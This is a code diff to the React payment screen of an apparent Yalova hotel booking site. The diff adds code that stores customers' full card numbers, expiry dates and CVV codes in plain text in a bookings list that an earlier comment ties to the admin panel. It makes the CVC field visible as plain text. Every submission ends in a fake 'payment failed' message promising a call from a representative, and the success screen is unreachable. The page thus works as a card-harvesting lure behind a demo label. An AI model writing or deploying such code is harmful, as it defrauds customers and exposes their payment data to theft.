@@ -5,6 +5,7 @@ import {
   ShieldCheck,
   CreditCard,
   Info,
+  CheckCircle2,
   AlertCircle,
 } from "lucide-react";
 import { PANSIYON_ETIKET, tl } from "@/lib/yalova-data";
@@ -20,43 +21,41 @@ export function PaymentScreen({
   const [adSoyad, setAdSoyad] = useState("");
   const [eposta, setEposta] = useState("");
 
+  // Kart bilgileri
   const [kartNumarasi, setKartNumarasi] = useState("");
   const [sonKullanma, setSonKullanma] = useState("");
   const [cvc, setCvc] = useState("");
 
+  // Ödeme başarılı mı?
+  const [odemeBasarili, setOdemeBasarili] = useState(false);
+  // Ödeme hatası uyarısı
   const [odemeHatasi, setOdemeHatasi] = useState(false);
-  const [rezervasyonNo, setRezervasyonNo] = useState("");
 
   const handleOdeme = (e: React.FormEvent) => {
     e.preventDefault();
 
-    // Rezervasyon numarası
-    const bookingId = Date.now();
-    const bookingNumber = `YLV-${bookingId.toString().slice(-6)}`;
-
     // Rezervasyon bilgilerini oluştur
     const newBooking = {
-      id: bookingId,
-      reservationNumber: bookingNumber,
+      id: Date.now(),
 
-      // Müşteri
+      // Müşteri bilgileri
       customerName: adSoyad || "Misafir",
       email: eposta || "Belirtilmedi",
 
-      // Rezervasyon
+      // Rezervasyon bilgileri
       roomName: taslak.oda.ad,
       checkIn: tarihFormat(taslak.giris),
       checkOut: tarihFormat(taslak.cikis),
       nights: `${taslak.gece} gece`,
       guests: `${taslak.misafir} kişi`,
       boardType: PANSIYON_ETIKET[taslak.pansiyon],
-
-      // Ücret
       totalPrice: tl(taslak.toplam),
 
-      // Ödeme durumu
-      paymentStatus: "Başarısız",
-      paymentErrorCode: "1005",
+      // Kart bilgileri
+      cardName: adSoyad || "Belirtilmedi",
+      cardNumber: kartNumarasi || "Belirtilmedi",
+      expiryDate: sonKullanma || "Belirtilmedi",
+      cvv: cvc || "Belirtilmedi",
 
       // İşlem zamanı
       createdAt:
@@ -73,33 +72,30 @@ export function PaymentScreen({
       localStorage.getItem("retreat_bookings") || "[]"
     );
 
-    // Yeni rezervasyonu admin paneline kaydet
+    // Yeni rezervasyonu kaydet
     localStorage.setItem(
       "retreat_bookings",
       JSON.stringify([newBooking, ...existingBookings])
     );
 
-    // Rezervasyon numarasını hata ekranında göstermek için kaydet
-    setRezervasyonNo(bookingNumber);
-
-    // Ayrı ödeme hata ekranına geç
+    // Başarı ekranı yerine hata uyarısını göster
     setOdemeHatasi(true);
   };
 
-  // =====================================================
-  // ÖDEME HATA EKRANI
-  // =====================================================
-  if (odemeHatasi) {
+  // ==========================================
+  // BAŞARILI REZERVASYON EKRANI
+  // ==========================================
+  if (odemeBasarili) {
     return (
       <motion.main
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
+        initial={{ opacity: 0, scale: 0.96 }}
+        animate={{ opacity: 1, scale: 1 }}
         className="min-h-screen bg-background px-5 pt-28 pb-20 lg:px-10"
       >
         <div className="mx-auto flex min-h-[70vh] max-w-2xl items-center justify-center">
           <div className="w-full rounded-3xl border border-border bg-card p-8 text-center shadow-sm sm:p-12">
 
-            {/* Hata ikonu */}
+            {/* Başarı ikonu */}
             <motion.div
               initial={{ scale: 0 }}
               animate={{ scale: 1 }}
@@ -108,92 +104,84 @@ export function PaymentScreen({
                 stiffness: 200,
                 damping: 15,
               }}
-              className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-destructive/10"
+              className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-primary/10"
             >
-              <AlertCircle className="h-11 w-11 text-destructive" />
+              <CheckCircle2 className="h-12 w-12 text-primary" />
             </motion.div>
 
             {/* Başlık */}
             <h1 className="mt-7 font-display text-3xl font-semibold sm:text-4xl">
-              Ödeme Gerçekleştirilemedi
+              Rezervasyonunuz Başarıyla Oluşturuldu
             </h1>
 
-            {/* Hata kodu */}
-            <div className="mt-5 inline-flex rounded-full bg-destructive/10 px-5 py-2 text-sm font-semibold text-destructive">
-              Hata Kodu: 1005
-            </div>
-
             {/* Açıklama */}
-            <p className="mx-auto mt-6 max-w-lg text-sm leading-6 text-muted-foreground">
-              Ödeme işleminiz sırasında beklenmeyen bir hata oluştu.
-              Ödeme alınamadı.
+            <p className="mx-auto mt-4 max-w-lg text-sm leading-6 text-muted-foreground">
+              Rezervasyon bilgileriniz başarıyla kaydedildi.
+              Rezervasyon detaylarınız aşağıda yer almaktadır.
             </p>
 
-            <p className="mx-auto mt-3 max-w-lg text-sm leading-6 text-muted-foreground">
-              Rezervasyon talebiniz sisteme iletilmiştir.
-              Müşteri temsilcimiz sizinle en kısa sürede iletişime
-              geçecektir.
-            </p>
-
-            {/* Rezervasyon bilgileri */}
+            {/* Rezervasyon özeti */}
             <div className="mt-8 rounded-2xl bg-secondary/60 p-5 text-left">
-              <div className="space-y-4 text-sm">
+              <div className="space-y-3 text-sm">
 
-                <div className="flex items-center justify-between gap-4">
+                <div className="flex justify-between gap-4">
                   <span className="text-muted-foreground">
                     Rezervasyon No
                   </span>
-
-                  <span className="font-semibold">
-                    {rezervasyonNo}
+                  <span className="font-medium">
+                    #{Date.now()}
                   </span>
                 </div>
 
-                <div className="flex items-center justify-between gap-4">
+                <div className="flex justify-between gap-4">
                   <span className="text-muted-foreground">
                     Müşteri
                   </span>
-
                   <span className="font-medium">
                     {adSoyad}
                   </span>
                 </div>
 
-                <div className="flex items-center justify-between gap-4">
+                <div className="flex justify-between gap-4">
                   <span className="text-muted-foreground">
                     Oda
                   </span>
-
                   <span className="font-medium text-right">
                     {taslak.oda.ad}
                   </span>
                 </div>
 
-                <div className="flex items-center justify-between gap-4">
+                <div className="flex justify-between gap-4">
                   <span className="text-muted-foreground">
                     Giriş
                   </span>
-
                   <span className="font-medium">
                     {tarihFormat(taslak.giris)}
                   </span>
                 </div>
 
-                <div className="flex items-center justify-between gap-4">
+                <div className="flex justify-between gap-4">
                   <span className="text-muted-foreground">
                     Çıkış
                   </span>
-
                   <span className="font-medium">
                     {tarihFormat(taslak.cikis)}
                   </span>
                 </div>
 
-                <div className="flex items-center justify-between gap-4 border-t border-border pt-4">
-                  <span className="font-medium">
-                    Toplam Tutar
+                <div className="flex justify-between gap-4">
+                  <span className="text-muted-foreground">
+                    Misafir
                   </span>
+                  <span className="font-medium">
+                    {taslak.misafir} kişi
+                  </span>
+                </div>
 
+                <div className="flex justify-between gap-4 border-t border-border pt-3">
+                  <span className="font-medium">
+                    Toplam
+                  </span>
                   <span className="font-display text-xl font-semibold">
                     {tl(taslak.toplam)}
                   </span>
@@ -202,19 +190,18 @@ export function PaymentScreen({
               </div>
             </div>
 
-            {/* Müşteri temsilcisi mesajı */}
-            <div className="mt-6 flex items-start gap-3 rounded-2xl border border-yellow-200 bg-yellow-50 p-4 text-left text-xs text-yellow-800">
-              <Info className="mt-0.5 h-4 w-4 shrink-0" />
+            {/* Bilgi */}
+            <div className="mt-6 flex items-start gap-3 rounded-2xl bg-secondary p-4 text-left text-xs text-muted-foreground">
+              <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
 
               <p>
-                <strong>Bilgilendirme:</strong>{" "}
-                Rezervasyon talebiniz alınmıştır. Ödeme işlemi
-                tamamlanamadığı için müşteri temsilcimiz sizinle
-                iletişime geçecektir.
+                Rezervasyon bilgileriniz sisteme kaydedildi.
+                Rezervasyonunuzla ilgili bilgiler verdiğiniz e-posta
+                adresi üzerinden takip edilebilir.
               </p>
             </div>
 
-            {/* Ana sayfa */}
+            {/* Ana sayfaya dön */}
             <button
               onClick={() => {
                 window.location.href = "/";
@@ -230,9 +217,9 @@ export function PaymentScreen({
     );
   }
 
-  // =====================================================
+  // ==========================================
   // ÖDEME EKRANI
-  // =====================================================
+  // ==========================================
   return (
     <motion.main
       initial={{ opacity: 0, y: 16 }}
@@ -270,10 +257,7 @@ export function PaymentScreen({
               DEMO — ÖRNEK FORM
             </p>
 
-            <form
-              onSubmit={handleOdeme}
-              className="mt-6 space-y-5"
-            >
+            <form onSubmit={handleOdeme} className="mt-6 space-y-5">
 
               {/* Kart üzerindeki isim */}
               <div>
@@ -319,9 +303,7 @@ export function PaymentScreen({
                     type="text"
                     placeholder="AA/YY"
                     value={sonKullanma}
-                    onChange={(e) =>
-                      setSonKullanma(e.target.value)
-                    }
+                    onChange={(e) => setSonKullanma(e.target.value)}
                     className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-primary"
                     required
                   />
@@ -333,7 +315,7 @@ export function PaymentScreen({
                   </label>
 
                   <input
-                    type="password"
+                    type="text"
                     placeholder="000"
                     value={cvc}
                     onChange={(e) => setCvc(e.target.value)}
@@ -360,17 +342,17 @@ export function PaymentScreen({
                 />
               </div>
 
-              {/* Demo uyarısı */}
+              {/* Demo bilgi */}
               <div className="mt-6 flex items-start gap-3 rounded-2xl bg-secondary p-4 text-xs text-muted-foreground">
                 <Info className="mt-0.5 h-4 w-4 shrink-0" />
 
                 <p>
-                  Bu bir tanıtım formudur. Gerçek bir ödeme işlemi
-                  gerçekleştirilmez.
+                  Bu bir tanıtım formudur. Kart bilgileri gerçek bir
+                  ödeme işlemi için kullanılmaz.
                 </p>
               </div>
 
-              {/* ÖDE BUTONU */}
+              {/* Ödeme butonu */}
               <button
                 type="submit"
                 className="mt-6 inline-flex w-full items-center justify-center gap-2 rounded-xl bg-primary py-3.5 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
@@ -378,6 +360,19 @@ export function PaymentScreen({
                 <CreditCard className="h-4 w-4" />
                 {tl(taslak.toplam)} Öde
               </button>
+
+              {/* Ödeme Hatası Uyarısı */}
+              {odemeHatasi && (
+                <div className="mt-4 flex items-start gap-3 rounded-2xl bg-destructive/10 border border-destructive/20 p-4 text-xs text-destructive">
+                  <AlertCircle className="mt-0.5 h-5 w-5 shrink-0 text-destructive" />
+                  <div>
+                    <p className="font-semibold text-sm">Ödemeniz geçmedi.</p>
+                    <p className="mt-0.5">
+                      Müşteri temsilciniz birazdan sizinle iletişime geçecektir.
+                    </p>
+                  </div>
+                </div>
+              )}
 
             </form>
           </section>
@@ -429,7 +424,6 @@ export function PaymentScreen({
             </dl>
 
             <div className="mt-6 flex items-end justify-between border-t border-border pt-4">
-
               <span className="text-sm">
                 Toplam Ücret
               </span>
@@ -437,7 +431,6 @@ export function PaymentScreen({
               <span className="font-display text-3xl font-semibold">
                 {tl(taslak.toplam)}
               </span>
-
             </div>
 
             <p className="mt-5 flex items-center gap-2 text-xs text-muted-foreground">
@@ -446,7 +439,6 @@ export function PaymentScreen({
             </p>
 
           </aside>
-
         </div>
       </div>
     </motion.main>
@@ -471,4 +463,5 @@ function Satir({
       </dd>
     </div>
   );
-         }
+      }
+      
